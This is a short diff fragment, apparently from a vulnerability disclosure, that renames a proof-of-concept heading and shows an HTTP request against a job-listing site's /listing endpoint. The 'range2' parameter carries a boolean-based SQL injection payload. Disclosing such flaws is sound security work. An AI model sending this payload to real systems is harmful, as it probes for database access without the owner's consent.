@@ -8,7 +8,7 @@
 "service_fragments/css/gig_detail.css"
 ```
 
-## poc
+## POC
 
 ```java
 GET /listing?cat=6&filter=1&job-type=1&keywords=Mr.&location=1&order=desc&placeid=US&placetype=country&range1=1&range2=1) AND 6477=6477 AND (1232=1232&salary-type=1&sort=id&subcat= HTTP/1.1
